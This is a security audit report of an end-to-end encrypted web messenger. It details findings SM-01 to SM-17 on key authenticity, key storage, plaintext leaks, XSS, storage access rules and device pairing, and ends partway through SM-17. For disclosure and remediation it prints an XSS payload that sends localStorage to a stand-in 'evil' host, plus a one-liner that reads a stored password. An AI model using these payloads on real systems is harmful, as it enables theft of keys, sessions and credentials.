# Secure Messenger — Security Review

**Application:** Secure Messenger — standalone client-side end-to-end encrypted (E2EE) web messenger
**Backend:** Supabase (Postgres + Auth + Realtime + Storage + one edge function `user-lookup`)
**Crypto stack:** TweetNaCl (X25519 box, XSalsa20-Poly1305 secretbox) via jsdelivr CDN; Web Crypto (HKDF-SHA256, PBKDF2-SHA256 600k, AES-256-GCM for backups)
**Review type:** Adversarial source-grounded review with independent verification of each finding
**Date:** 2026-06-22

---

## 1. Executive Summary

This review consolidates a large adversarial audit of the Secure Messenger codebase. Every finding below was verified against the actual source (exact `file:line`) and adjusted to the verdict-confirmed severity. Overlapping findings reported across multiple audit dimensions have been merged into single canonical issues (see the *Merged from* notes).

The headline conclusion is blunt: **the application markets an end-to-end-encryption guarantee that the current code does not deliver against its own stated threat model (an untrusted server).** Three structural failures dominate:

1. **No key authenticity.** The peer's public key is fetched unauthenticated from a server table on every send; there is no TOFU pinning and the implemented safety-number primitive is never surfaced in the UI. A malicious or compromised server silently MITMs every conversation.
2. **The long-term identity secret is poorly protected at every layer.** It is stored unencrypted in IndexedDB, exported off-device during pairing wrapped only by a 6-digit code derived with a single unsalted SHA-256, and there is no forward secrecy (static-static ECDH, epoch hardcoded to 0). A single key compromise is total and permanent.
3. **The "encrypted" message body is leaked in plaintext to a server table** via the notification preview pipeline, and **stored XSS** in the message renderer can directly exfiltrate the in-origin secret key.

In addition, the Supabase Storage bucket holding attachments is world-accessible to any authenticated user (read and delete), and the device-pairing code is brute-forceable offline in under a second.

### Severity counts (post-deduplication, verdict-adjusted)

| Severity | Count |
|----------|-------|
| Critical | 7 |
| High     | 14 |
| Medium   | 10 |
| Low      | 14 |
| Info     | 4 |
| **Total** | **49** |

### Top risks (fix first)

| ID | Title | Severity |
|----|-------|----------|
| SM-01 | No public-key authenticity / TOFU pinning → silent server-side MITM | Critical |
| SM-02 | Identity secret key stored unencrypted in IndexedDB | Critical |
| SM-03 | E2EE message plaintext preview written to server-side notifications table | Critical |
| SM-04 | Stored XSS via decrypted message content in `renderMessageThread` | Critical |
| SM-05 | Storage bucket RLS: any authenticated user can download/delete every attachment | Critical |
| SM-06 | Device-pairing code brute-forceable: 10⁶ space, single unsalted SHA-256, no rate limit | Critical |
| SM-07 | Key material printed to console, whitelisted to appear in production | Critical |

---

## 2. Findings

Each finding has a stable ID. Where the same root cause was reported under several audit dimensions, the finding has been merged and the source dimensions noted.

---

### CRITICAL

---

#### SM-01 — No public-key authenticity / TOFU pinning → silent server-side MITM

- **Severity:** Critical
- **Category:** MITM / key authenticity
- **Affected:** `encryption/services/keyManagementService.js:741` (`establishSession` → `getCurrentKey`), `:758-760` (ECDH), `:982` (`getSafetyNumber` defined, never called); `encryption/services/historicalKeysService.js:156-191` (`getCurrentKey` reads `identity_keys.public_key` raw); `encryption/services/cryptoPrimitivesService.js:232-266` (`generateSafetyNumber`, never invoked); `encryption/facade/encryptionFacade.js:174` (`getSafetyNumber` wrapper, no callers); `database/setup/messaging-schema.sql:190-191` (`identity_keys_select_all USING(true)`)
- **Merged from:** crypto-correctness (TOFU) + rls-authz (`identity_keys` world-readable, no authenticity binding)

**Description.** The session key is derived from the peer's public key fetched unauthenticated from the `identity_keys` table on every `establishSession`. There is no trust-on-first-use pinning, no signature/certificate over the key, and no comparison against a previously seen key. `generateSafetyNumber()`/`getSafetyNumber()` are fully implemented but have **zero callers** in any controller or view, so users have no way to detect a key substitution. The decrypt path (`_deriveSessionFromHistory`, `:1180-1197`) reuses the same unauthenticated lookup, so substitution breaks both directions. The `historical_keys` IndexedDB cache is not a defense: it is a writable mirror of server data and `getCurrentKey` bypasses it to read the live table each time.

**Exploit scenario.** A compromised/malicious Supabase (or a service-role insider, or an RLS bypass) updates `identity_keys.public_key` for Bob to the attacker's key. When Alice calls `establishSession`, she computes ECDH against the attacker key, encrypts to it, the attacker decrypts/re-encrypts to Bob's real key and relays. Neither party is ever shown a safety number, so the swap is invisible — complete, silent break of E2EE.

**Remediation.**
1. Implement TOFU: on first contact persist the peer's public key in IndexedDB (a dedicated pinned-keys store) and **hard-fail** (or require explicit user re-verification) if `getCurrentKey` ever returns a different key for that user.
2. Wire the existing `generateSafetyNumber`/`getSafetyNumber` into the conversation UI and require/encourage out-of-band verification before first send. Surface a loud warning on any key/epoch change.
3. Ideally add a key-transparency log (append-only) so silent swaps are externally detectable, and have each user sign their identity key with a verifiable credential rather than trusting the bare `identity_keys` row.
4. Restrict `identity_keys_select_all` to `TO authenticated` and route discovery through the rate-limited edge function instead of a world-readable directory (see SM-23, SM-44).

---

#### SM-02 — Identity secret key stored unencrypted in IndexedDB

- **Severity:** Critical
- **Category:** Insecure key storage at rest
- **Affected:** `encryption/services/keyStorageService.js:117-142` (`storeIdentityKeys`, secret-key write at `:123`), `:149-176` (`getIdentityKeys`); `encryption/services/cryptoPrimitivesService.js:188-201` (`serializeKey`/`deserializeKey` = plain base64); DB name `MoneyTrackerEncryption` (`keyStorageService.js:34`)

**Description.** The X25519 identity **secret** key is serialized with plain base64 and written verbatim into the IndexedDB `identity_keys` object store. There is no at-rest encryption layer. IndexedDB is unencrypted on disk (e.g. `~/Library/Application Support/<browser>/.../IndexedDB`) and readable by any process running as the user, by malware, by a malicious extension, or from a synced/backed-up profile or forensic image. Because the design uses static-static ECDH with rotation disabled (see SM-09), this single secret decrypts **every** past and future message in **every** conversation.

**Exploit scenario.** An attacker with read access to the victim's browser profile opens the IndexedDB database, reads `identity_keys.secretKey`, base64-decodes it, and reconstructs the keypair via `nacl.box.keyPair.fromSecretKey`. They then decrypt all history and future traffic and impersonate the victim. No password required.

**Remediation.** Wrap the local secret key at rest. Preferred: store the identity private key as a **non-extractable** WebCrypto `CryptoKey` object so raw bytes never enter the JS heap. Alternatively derive a storage-encryption key (WebAuthn/passkey PRF, or the existing PBKDF2 path) and AES-256-GCM encrypt `secretKey` before storing, decrypting only into memory on use. Never persist raw `secretKey` bytes.

---

#### SM-03 — E2EE message plaintext preview written to server-side notifications table

- **Severity:** Critical
- **Category:** Information leakage / confidentiality
- **Affected:** `messaging/services/messagingService.js:155` (`messagePreview: content.trim().substring(0, 100)`); `notificationProcessor.js:312-315` (embeds preview verbatim); `notificationService.js:116-118` (direct insert) and `:156-166` (RLS-bypassing RPC `create_notification`, param `p_message`)

**Description.** `sendMessage()` encrypts the message body for the `messages` table, then takes the **plaintext** content and passes the first 100 characters as `messagePreview` into the notification pipeline. `NotificationProcessor._generateMessage` embeds it verbatim (`"${fromEmail} sent you a message: \"${messagePreview}...\""`), and `NotificationService.createNotification` persists that string into the `notifications.message` column server-side. The first 100 chars of every supposedly end-to-end-encrypted message are therefore stored in cleartext on the server — for most chat messages, the entire message.

**Exploit scenario.** Anyone with read access to the Postgres `notifications` table (Supabase dashboard, a DB backup, a compromised service-role key, SQL injection elsewhere) runs `SELECT message FROM notifications WHERE type='message_received'` and recovers the plaintext of every message ever sent, for all users, with no keys.

**Note on packaging.** The `notifications` table DDL and `create_notification` RPC are inherited from a parent (non-messenger) app and are not present in this repo's SQL. Where the deployed DB lacks the table, the insert throws and is swallowed by the `try/catch` at `messagingService.js:159` — i.e. the missing DDL is an accident of packaging, not a safeguard. Any deployment carrying the inherited subsystem leaks.

**Remediation.** Never send plaintext (or a derivative) outside the encrypted channel. For `message_received` notifications store only non-content metadata (sender id/email, conversation id, timestamp) and render a generic body (`"You have a new message"`). Delete the `messagePreview` argument at `messagingService.js:155` and the preview branch at `notificationProcessor.js:312-315`. If a preview is ever required it must be encrypted to the recipient's key.

---

#### SM-04 — Stored XSS via decrypted message content / sender email / attachment filename in `renderMessageThread`

- **Severity:** Critical
- **Category:** XSS (DOM, stored)
- **Affected:** `messaging/controllers/messengerController.js:1147-1159` (template), `:1150` (`msg.content`), `:1149` (`senderEmail`), `:1118` (attachment `fileName`), `:1159` (`messageThread.innerHTML`); source `encryptionFacade.decryptMessage` via `messagingService.js:273/294`; call site `:629` (`openConversation → renderMessageThread`). No CSP on `messenger.html`.
- **Merged from:** xss-dom (message content, sender email) + attachments-storage (filename in default load path) — all three untrusted strings flow into the same unescaped `innerHTML` sink.

**Description.** `renderMessageThread()` interpolates the decrypted plaintext `msg.content`, the `senderEmail`, and the attachment `fileName` raw into a template literal assigned to `messageThread.innerHTML` with **no escaping**. This is the default conversation-load path and runs every time a user opens any conversation. The escaping was clearly available: the sibling `_appendMessageToThread` escapes content and email (`:958-959`), `_escapeHtml` exists (`:1028-1033`), and `Validators.sanitizeHtml` exists (`validators.js:98`) — none are applied here. There is no Content-Security-Policy on `messenger.html`.

**Exploit scenario.** Any user who can message the victim (or a malicious server controlling `other_user_email`, or an attacker-named attachment) sends content such as `<img src=x onerror="navigator.sendBeacon('https://evil/?d='+btoa(JSON.stringify(localStorage)))">`. On conversation open the payload executes in the victim's authenticated origin. Because the identity secret key sits unencrypted in IndexedDB (SM-02), the Supabase session is in storage, and the login password is in `sessionStorage` (SM-08), the payload exfiltrates the private key, session, and password — fully defeating E2EE. The message persists and re-fires on every open.

**Remediation.** Escape every untrusted interpolation (`msg.content`, `senderEmail`, `fileName`) via `this._escapeHtml(...)`, or build nodes with `createElement` + `textContent` and never place untrusted strings into `innerHTML`. Centralize the message/attachment markup into one escaping helper shared by all render paths. Add a strict CSP (SM-43) and, if rich rendering is ever needed, use DOMPurify.

---

#### SM-05 — Storage bucket RLS: any authenticated user can download/delete every attachment

- **Severity:** Critical
- **Category:** Broken access control / Storage RLS / IDOR
- **Affected:** `database/setup/messaging-schema.sql:619-638` (three `storage.objects` policies — INSERT `:621-624`, SELECT `:627-631`, DELETE `:633-638`), each gated only by `bucket_id = 'message-attachments'`; path format `attachmentService.js:287` (`${conversationId}/...`); bucket-root list at `attachmentService.js:63`; delete at `:325/:470`; download at `:376-378`
- **Merged from:** rls-authz (storage download/delete) + attachments-storage (cross-conversation IDOR + cross-user destructive delete). The over-permissive **upload** policy is tracked separately as SM-33 because its impact (flooding/path-poisoning) differs.

**Description.** All three `storage.objects` policies gate access **only** on the bucket id with no path/owner/participant scoping. Any authenticated user can SELECT (download) or DELETE every object in the bucket. The object key is `${conversationId}/${timestamp}-${randomId}` where `conversationId` is a sequential `BIGSERIAL`, and bucket-root listing is permitted — so paths are fully enumerable. The table-level RLS on `message_attachments` correctly scopes the *metadata* row, but the encrypted bytes live in Storage and are governed only by these policies.

**Exploit scenario.**
- **Destruction (no key needed):** an attacker calls `.list('')` to enumerate folders, then `.remove([...])` to delete every attachment system-wide — a global wipe (availability/integrity), leaving orphaned DB rows whose `download()` then fails.
- **Confidentiality of ciphertext + metadata:** `.download()` every object for an offline corpus (harvest-now-decrypt-later), plus file existence/sizes/counts/conversation-ids for traffic analysis. (Plaintext is protected because per-file keys live in the participant-scoped DB row; the dominant impact is the unauthenticated cross-tenant delete.)

**Remediation.** Scope all three storage policies to the path's first segment (conversation id) and verify participation, e.g.:
```sql
USING (
  bucket_id = 'message-attachments'
  AND EXISTS (
    SELECT 1 FROM conversations c
    WHERE c.id = (split_part(name,'/',1))::bigint
      AND (c.user1_id = auth.uid() OR c.user2_id = auth.uid())
  )
)
```
Restrict DELETE/UPDATE further to the uploader by joining `message_attachments` on `storage_path = name AND uploader_id = auth.uid()`. Prefer a per-user prefix and `storage.foldername()`; keep the bucket private and never expose `.list` at the bucket root.

---

#### SM-06 — Device-pairing code brute-forceable: 10⁶ space, single unsalted SHA-256, no rate limit

- **Severity:** Critical
- **Category:** Authentication / brute-force + weak key derivation
- **Affected:** `messaging/services/devicePairingService.js:18` (`Math.random()`-generated 6-digit code), `:96-161` (`verifyPairingCode`, direct `{user_id, pairing_code}` lookup, no attempt counter), `:271-280` (`_derivePairingKey` = single `SHA-256(\`${code}:${userId}\`)`), `:289-341` (secretbox wrap of identity secret); table `database/setup/messaging-schema.sql:276-314` (no attempt column; `expires_at` not enforced in RLS)
- **Merged from:** device-pairing (brute-force) + device-pairing (unsalted SHA-256 KDF) + rls-authz (`device_keys` 6-digit protection). These are one chain: a weakly-generated low-entropy code, wrapped by a zero-work-factor KDF, with no rate limit.

**Description.** A pairing request stores the user's full encrypted identity secret key keyed by a 6-digit numeric code (900,000 values), generated with non-cryptographic `Math.random()`. The wrapping key is `SHA-256(code:userId)` — a single hash, no salt, no iteration; `userId` is public, so the only secret is the ~20-bit code. There is no rate limit, attempt counter, or lockout, and `expires_at` is enforced only in client JS, not RLS.

**Exploit scenario.** An attacker who obtains one `device_keys` row (service-role/edge-function bug, DB backup, RLS-broadening misconfig, or the server itself under the stated untrusted-server model) takes `encrypted_secret_key` + `encryption_nonce` and brute-forces all candidates offline: for each code compute `SHA-256(code:userId)` and attempt `secretbox.open`; the Poly1305 tag is a clean correctness oracle. The full keyspace is exhausted in well under a second, recovering the X25519 identity secret and fully defeating E2EE.

**Note.** RLS (`device_keys_select_own`, `:301-302`) blocks cross-user SELECT, so this is not exploitable by an arbitrary peer in steady state. It is critical because the protected asset is the **long-term identity private key** and the protection is grossly inadequate for it.

**Remediation.**
1. Do not protect a long-term identity secret with a 6-digit code: use a high-entropy pairing secret (≥128 bits via `crypto.getRandomValues`, shown as QR/long code), or avoid exporting the secret at all (see SM-21).
2. Replace the single SHA-256 with a memory-hard/iterated KDF (Argon2id, or PBKDF2-SHA256 ≥600k) and a random per-request salt stored with the row.
3. Enforce server-side rate limiting and a hard failed-attempt cap (delete the row after 3–5 wrong attempts) via an edge function or DB attempt counter.
4. Enforce expiry server-side: add `expires_at > now()` to the SELECT policy and a scheduled `DELETE FROM device_keys WHERE expires_at < now()`.

---

#### SM-07 — Key material printed to console, whitelisted to appear in production

- **Severity:** Critical
- **Category:** Key-material logging
- **Affected:** `encryption/services/keyManagementService.js:745` (full peer public key), `:754` (full own public key), `:755` (identity secret-key 12-char prefix), `:762-764` (8 bytes of ECDH shared secret + false "safe to log" comment), `:768-769`/`:829-830` (8 bytes of session key), `:839-840` (8 bytes of message key); `shared/config/loggingConfig.js:13` (`ENABLE_ALL_LOGS = true`), `:16` (`LOG_FILTER_MODE = 'filter'`), `:22` (`[KeyManagementService]` whitelisted), no hostname/production gate
- **Merged from:** crypto-correctness (key logging) + key-management-at-rest (verbose key logging) + info-leak-logging (key material logging). One root cause.

**Description.** `KeyManagementService` logs raw key material to the console: full public keys, a 12-char prefix of the identity **secret** key, and 8-byte previews of the ECDH shared secret, session key, and per-message key — accompanied by a false comment claiming the shared secret is "safe to log." These run under the `[KeyManagementService]` prefix, which is explicitly whitelisted in `loggingConfig.js`; `loggingConfig` defaults to `ENABLE_ALL_LOGS = true` with `LOG_FILTER_MODE = 'filter'` and **no** environment/hostname check. Because every service calls raw `console.*` (not the production-gated `Logger`), these crypto logs appear in a deployed production browser console, not just localhost. The session/shared keys are long-lived constants (SM-09), so leaked fragments remain useful indefinitely.

**Exploit scenario.** A shoulder-surfer, screen-share viewer, malicious browser extension, or a console-capturing error-reporting SDK on the production site harvests the secret-key prefix and key fragments while the victim uses the app. Combined with SM-02 (unencrypted IndexedDB key) and the static session keys, this materially aids confirmation/correlation and offline analysis.

*Severity note:* one of the source reports rated this `high` on the grounds that only prefixes (not full secrets) leak; it is consolidated here as **critical** because the same code logs (a) the identity-secret prefix and (b) is on-by-default in production — a deliberate, shipped key-hygiene breach in an E2EE product. The full keys logged at `:745/:754` are public and not themselves confidential.

**Remediation.** Delete every log statement emitting any key bytes/prefixes, public keys, shared secrets, session keys, or message keys (`:745, :754-755, :762-764, :768-769, :829-830, :839-840`) — never log even an 8-byte prefix. Remove `[KeyManagementService]`, `[CryptoService]`, `[KeyStorageService]`, `[KeyManager]` from `ALLOWED_PREFIXES`. Set `ENABLE_ALL_LOGS = false`, add a real production hostname gate, and route all logging through the already-gated `Logger` (see SM-46).

---

### HIGH

---

#### SM-08 — Login/signup password persisted in `sessionStorage` cleartext for up to 10 minutes

- **Severity:** High
- **Category:** Plaintext credential storage
- **Affected:** `shared/utils/passwordManager.js:30-45` (`storeTemporarily`, write at `:39`; key `money_tracker_temp_password` `:21`; `MAX_AGE_MS` `:22`), `:167-171` (deliberately not cleared on unload); callers `auth/views/auth.html:746` (sign-in), `:819` (sign-up), `:924` (reset)

**Description.** After sign-in, sign-up, and password reset the raw account password is written to `sessionStorage` as cleartext JSON (`{password, timestamp, used}`), retained up to 10 minutes. `sessionStorage` is synchronously readable by any same-origin JavaScript (XSS, a malicious dependency, the un-SRI'd TweetNaCl CDN script). The password is the input to PBKDF2 (`deriveKeyFromPassword`), so capturing it enables decryption of the identity-key backup **and** the session-backup key from `identity_key_backups`.

**Exploit scenario.** Any XSS (SM-04) or a compromised CDN script (SM-19/SM-20) runs `JSON.parse(sessionStorage.money_tracker_temp_password).password` within the window, exfiltrates the password, pulls the victim's `identity_key_backups` row, and runs the documented PBKDF2-SHA256(600k)+AES-GCM decrypt to recover the identity secret key — defeating E2EE without touching the device.

**Remediation.** Do not store the raw password. Immediately after login derive the needed key material (or a non-extractable `CryptoKey`) and keep only that in a module-scoped in-memory variable, never in web storage; zeroize on use. If cross-navigation persistence is needed, redesign so backup/restore happens in a single page context. Remove the 10-minute window.

---

#### SM-09 — Static-static ECDH, epoch hardcoded 0, rotation disabled → no forward secrecy

- **Severity:** High
- **Category:** Forward secrecy / protocol design
- **Affected:** `encryption/services/cryptoPrimitivesService.js:98-101` (`deriveSharedSecret = nacl.box.before`); `encryption/services/keyManagementService.js:725` (`epoch = 0`, "rotation disabled"), `:760/:767` (derive), `:816`/`:881`/`:965`/`:1198` (epoch 0 everywhere), `:651-656` (`checkAndRotateIfNeeded` returns `auto_rotation_disabled`); `keyDerivationService.js:51-66` (deterministic HKDF chain, not a ratchet)

**Description.** The session key is a pure function of the two long-term identity keys (`nacl.box.before` then HKDF with constant info). The epoch is hardcoded to 0 in every path and rotation is explicitly disabled. There is no ephemeral DH and no ratchet, so the per-pair session key is constant for the lifetime of the identity keys; counters only deterministically diversify message keys, which are recomputable and never erased.

**Exploit scenario.** An attacker who ever obtains one party's identity secret (trivial given SM-02) recomputes the single static session key for every conversation that user has and decrypts **all** past and future captured ciphertext. No forward secrecy, no post-compromise security — a single key compromise is catastrophic and permanent.

**Remediation.** Implement an asymmetric ratchet (X3DH + Double Ratchet), or at minimum ephemeral DH per session plus a symmetric chain that deletes used message keys after use. Stop reusing identity keys as the session secret.

---

#### SM-10 — No replay protection: captured ciphertext re-decrypts forever

- **Severity:** High
- **Category:** Replay / message integrity
- **Affected:** `encryption/services/keyManagementService.js:875-925` (`decryptMessage`; counter read `:880`, epoch 0 `:881`, message key `:905`), `keyDerivationService.js:63-66` (deterministic `deriveMessageKey`); `cryptoPrimitivesService.js:137` (`secretbox.open` with no AAD); `messages` table `database/setup/messaging-schema.sql:446-460` (no `UNIQUE(conversation_id, sender_id, message_counter)`)

**Description.** Message keys are deterministic: `HKDF(sessionKey, 'MessageKey:0:{counter}')`. `decryptMessage` takes the counter from the stored row and re-derives the same key every time; there is no per-(conversation, sender) high-water mark and no DB uniqueness constraint. The AEAD binds no context (no associated data tying ciphertext to sender/conversation/counter). With the static session key, a given `(counter, nonce, ciphertext)` tuple decrypts successfully forever.

**Exploit scenario.** An attacker with insert access to `messages` (the untrusted server under the stated model) re-inserts or duplicates a previously sent row; each copy decrypts to the original plaintext and is re-displayed/re-notified to the recipient (e.g. replaying "Send the money"). The realtime INSERT subscription fires for any matching INSERT, so duplicates surface live. (RLS forces `auth.uid()=sender_id`, so a normal peer cannot replay — this requires the server/DB operator.)

**Remediation.** Track a per-(conversation, sender) monotonic received-counter high-water mark in IndexedDB and reject any counter ≤ last accepted. Bind `sender_id`, `conversation_id`, and `counter` into the AEAD as associated data (TweetNaCl secretbox has no AAD param — prepend these fields to the plaintext before encryption, or move to a construction with AAD). A DB `UNIQUE` constraint helps against accidental/peer duplicates but does **not** stop a malicious server that controls the DB, so the durable defense is client-side.

---

#### SM-11 — TweetNaCl crypto core loaded from CDN with no Subresource Integrity

- **Severity:** High
- **Category:** Supply chain / library integrity
- **Affected:** `encryption/services/cryptoLibraryLoader.js:57-58` (jsdelivr URLs), `:95-124` (`_loadScript` sets only `src`/`async`/`defer`, no `integrity`/`crossorigin`); defaults also `encryption/config/encryptionConfigBase.js:56-57` and `moneyTrackerEncryptionConfig.js:22-23`. No `integrity=` anywhere in the repo.
- **Merged from:** crypto-correctness (TweetNaCl no-SRI) + supply-chain (TweetNaCl no-SRI). Same root cause; the Supabase-CDN no-SRI is a distinct, lower-impact issue tracked as SM-32.

**Description.** The entire cryptographic core (X25519 box, XSalsa20-Poly1305 secretbox, `randomBytes`, hashing) is fetched at runtime from `cdn.jsdelivr.net` via a dynamically created `<script>` with no integrity hash and no `crossorigin`. The loader is on the live crypto path and performs no post-load authenticity check (it only checks that `nacl.box`/`secretbox` exist). For an E2EE app this is the single highest-leverage supply-chain target.

**Exploit scenario.** An attacker who compromises jsdelivr (CDN breach, BGP/DNS hijack, malicious mirror, or a malicious npm publish that jsdelivr mirrors) serves a backdoored `nacl-fast.min.js` that weakens `randomBytes` (predictable keys/nonces) or exfiltrates the identity `secretKey` on generation. All clients silently load it; every key and message is compromised. The CDN operator alone can mount this.

**Remediation.** Self-host the pinned, audited `nacl`/`nacl-util` bundles inside the app (a `shared/vendor/` precedent already exists for font-awesome) and load them with a relative `<script>`. If a CDN must be used, pin SRI: extend `_loadScript` to set `script.integrity = 'sha384-...'` and `script.crossOrigin = 'anonymous'` from config, and add the published hashes for the exact pinned versions.

---

#### SM-12 — No password strength enforcement before PBKDF2 — backup encrypted under an arbitrarily weak 8-char password

- **Severity:** High
- **Category:** Weak KDF input / insufficient entropy
- **Affected:** `encryption/services/passwordCryptoService.js:267` (`validatePasswordStrength`) and `:301` (`enforcePasswordStrength`) — both **defined, never called**; only gate is `password.length < 8` at `auth/views/auth.html:792` (signup), `:904` (reset), and `shared/services/authService.js:549` (signUp); `validators.js:43-46` length-only; backup chain `keyBackupService.js:80/91/143/154/203/206 → passwordCryptoService.encryptToBase64 → deriveKeyFromPassword` (PBKDF2-SHA256 600k + AES-256-GCM); ciphertext persisted `database/setup/messaging-schema.sql:764-770`

**Description.** The identity-key backup, recovery flow, and session-backup key are all encrypted under the account password. A `validatePasswordStrength`/`enforcePasswordStrength` helper ships but is never invoked; the only requirement is length ≥ 8, so a weak 8-char password (e.g. `password`) is accepted. 600k PBKDF2 iterations buy a fixed work-factor multiplier but cannot rescue a low-entropy password.

**Exploit scenario.** An attacker who reads `identity_key_backups` (compromised/curious server, SQL/backup leak, RLS gap) takes `password_encrypted_data`/`password_salt`/`password_iv` and runs an offline GPU dictionary attack against PBKDF2-SHA256(600k)+AES-GCM. A weak password falls in hours-to-days, yielding the identity secret key. (The salt is random per-encryption, so rainbow tables are defeated, but targeted single-user brute force is not.)

**Remediation.** Call `enforcePasswordStrength()` in the signup and set-new-password handlers (and in `authService.signUp`) and reject weak passwords before any backup is created. Raise the minimum length, require the existing complexity score, and migrate the backup KDF to Argon2id (memory-hard) since GPU attacks on PBKDF2-SHA256 are cheap.

---

#### SM-13 — Recovery-key format mismatch: Base32 generated, 24-word mnemonic required → recovery unusable, E2EE data orphaned

- **Severity:** High
- **Category:** Recovery-key format mismatch / unrecoverable backup
- **Affected:** `encryption/services/passwordCryptoService.js:183-186` (`generateRecoveryKey` → 32 bytes/base64), `:194-223` (`formatRecoveryKey` → dash-separated Base32, no spaces); restore UI `auth/views/auth.html:962-995` (splits on `/\s+/`, requires exactly 24 "words" at `:970, :978-981`); modal copy `:187, :519`; reset→recovery routing `:936-945`; regen blocked while backup exists `keyManagementService.js:162-168, :331-337`

**Description.** No BIP39/word-list implementation exists. `generateRecoveryKey` produces 32 bytes rendered by `formatRecoveryKey` as RFC4648 Base32 in dash-separated 4-char groups (~13 groups, **zero spaces**). But the restore handler treats the recovery key as exactly 24 space-separated words — the button enables only when `wordCount === 24` and the handler hard-rejects anything else. A real Base32 string is one "word", so it can never satisfy the gate. The "Customize"/typed-24-words path also fails because `parseRecoveryKey` rejects spaces as invalid Base32. After a password reset (the primary recovery use case) the user is permanently locked out of decrypting their backup; regenerating keys is blocked while a backup exists.

**Exploit scenario.** A user resets a forgotten password; the old backup fails to decrypt as expected and the UI offers recovery-key restore. The user pastes their saved Base32 key; the UI demands 24 words and refuses it. The identity secret key (and all encrypted message history) is unrecoverable — an availability/data-loss footgun.

**Remediation.** Make encoding and parser agree: either (a) implement a genuine 24-word BIP39 mnemonic for both display and restore, or (b) keep Base32 and change the restore/modal validation to strip dashes and validate the Base32 alphabet/length instead of counting whitespace words. Add a round-trip test: generate → format → parse → decrypt must succeed.

---

#### SM-14 — `identity_keys` world-readable to all authenticated users (key-swap + user enumeration)

- **Severity:** High
- **Category:** Broken access control / authorization design
- **Affected:** `database/setup/messaging-schema.sql:190-191` (`identity_keys_select_all FOR SELECT USING (true)`), `:196-197` (`identity_keys_update_own`); table grant `:202` (`TO authenticated`)
- **Relationship:** This is the access-control half of the MITM problem; the authenticity/TOFU half is SM-01. Listed separately because the remediation (RLS scoping + routing discovery through the edge function) is distinct from TOFU pinning.

**Description.** `identity_keys` is readable by every authenticated user (user UUID, public key, `current_epoch`, timestamps), enabling enumeration of all account UUIDs and activity timing. The owner can freely UPDATE their own `public_key` with no authenticity binding. *Correction to the original report:* it is **not** readable by anonymous/unauthenticated clients — the table grant is `TO authenticated` only and Supabase requires both a GRANT and a permissive policy for the `anon` role, so exposure is limited to any authenticated user (still a real broken-access-control/enumeration issue and full MITM enabler under SM-01).

**Exploit scenario.** Any authenticated client `SELECT`s `identity_keys` to harvest the complete list of user UUIDs and signup/activity timestamps, feeding deanonymization and the unsolicited-conversation vector (SM-25). Combined with SM-01, a swapped `public_key` yields silent MITM.

**Remediation.** Restrict the SELECT policy to `TO authenticated` for consistency, but the higher-value fixes are: route user discovery through the rate-limited `user-lookup` edge function (after it is authorized — SM-23) rather than a world-readable directory; add a key-transparency log; and implement TOFU pinning + safety-number verification (SM-01).

---

#### SM-15 — Blocking enforced only client-side; blocked sender can still write to `messages` via RLS

- **Severity:** High
- **Category:** Broken access control / missing server-side enforcement
- **Affected:** `messaging/services/messagingService.js:91-97` (client-side `checkIfBlocked` guard in `sendMessage`); RLS `messages_insert_participant` `database/setup/messaging-schema.sql:488-496` (no `blocked_users` check); `dataSharingService.js:350-356` (block check direction); `blocked_users_select_own` `:137`

**Description.** The only block enforcement is in client JS; the `messages` INSERT policy requires only `auth.uid()=sender_id` and conversation membership and never consults `blocked_users`. An attacker skips the JS guard (calls `supabase.from('messages').insert(...)` directly with their own JWT) and the message lands and arrives via realtime. The client check is moreover effectively non-functional in the normal direction: `checkIfBlocked(recipientId, senderId)` queries rows owned by the *sender* (whether the sender blocked the recipient), and `blocked_users_select_own` means an honest sender's client can never read the recipient's block rows — so it cannot detect being blocked even without a bypass.

**Exploit scenario.** Bob blocks Alice. Alice runs `supabase.from('messages').insert({conversation_id, sender_id:<alice>, recipient_id:<bob>, encrypted_content, encryption_nonce, message_counter})`. RLS allows it because Alice is a participant; Bob receives the message in real time. Blocking provides zero protection.

**Remediation.** Enforce blocking in the DB. Because `blocked_users_select_own` hides the recipient's rows from a plain subquery, use a `SECURITY DEFINER` helper and add to `messages_insert_participant`:
```sql
AND NOT public.is_blocked(messages.recipient_id, auth.uid())
```
Keep the client check as UX only, and fix its argument direction.

---

#### SM-16 — Full identity SECRET key exported off-device during pairing

- **Severity:** High
- **Category:** Key management / secret exposure
- **Affected:** `messaging/services/devicePairingService.js:30-64` (`createPairingRequest` uploads `keys.secretKey`), `:289-311` (`_encryptKeys` serializes + wraps secret key); `device_keys.encrypted_secret_key` `database/setup/messaging-schema.sql:282`; RLS `device_keys_select_own` `:301-302`

**Description.** `createPairingRequest` uploads the user's long-term identity secret key (wrapped by the weak code-derived key, SM-06) to the server-side `device_keys` table so a second device can pull it. A proper multi-device design should never need the raw long-term identity secret to leave the originating device; this makes the server a single point of total identity compromise. (RLS blocks cross-user SELECT, so the realistic attacker is the server/operator/DB compromise — exactly the threat model this encryption exists to defend.)

**Exploit scenario.** The server (or a DB/backup reader) obtains `encrypted_secret_key` + `encryption_nonce`, brute-forces the 6-digit code offline (SM-06) to recover the raw X25519 identity secret, then decrypts every message and impersonates the user indefinitely (rotation disabled, SM-09).

**Remediation.** Do not transmit the long-term identity secret. Use an authenticated device-to-device key exchange (new device generates its own keypair; primary encrypts only per-session material to it), or wrap the secret with a high-entropy, out-of-band-confirmed key (SM-06) and verify the receiving device's public key via a safety number before release. Minimize the window and add an attempt cap.

---

#### SM-17 — Stored XSS via attacker-controlled attachment filename (all render paths)

- **Severity:** High
- **Category:** XSS (stored)
- **Affected:** `messaging/controllers/messengerController.js` filename interpolated unescaped at `:940` (`_appendMessageToThread`, the realtime path — content/email ARE escaped at `:958-959` but the filename is not), `:1001` (`_updateMessageAttachments`), `:1118` (`renderMessageThread`), `:1503` (`appendMessageToThread` via `insertAdjacentHTML` `:1525`); source `attachmentService.js:309` (`file_name: file.name` stored verbatim; `validateFile` `:108-122` checks size only)
- **Relationship:** The `renderMessageThread` filename sink is also covered by the consolidated SM-04; this finding tracks the **other three** sinks (notably the otherwise-escaped realtime path `_appendMessageToThread`) and the unsanitized upload source.

**Description.** Every attachment-rendering block interpolates the filename raw. The filename comes straight from the uploaded `File` (no sanitization at upload, no escaping at render). Crucially the realtime receive path `_appendMessageToThread` escapes content and email but **not** the filename, so even that path is vulnerable. Filenames can contain HTML metacharacters, and an attacker can craft the storage upload + `message_attachments` insert directly.

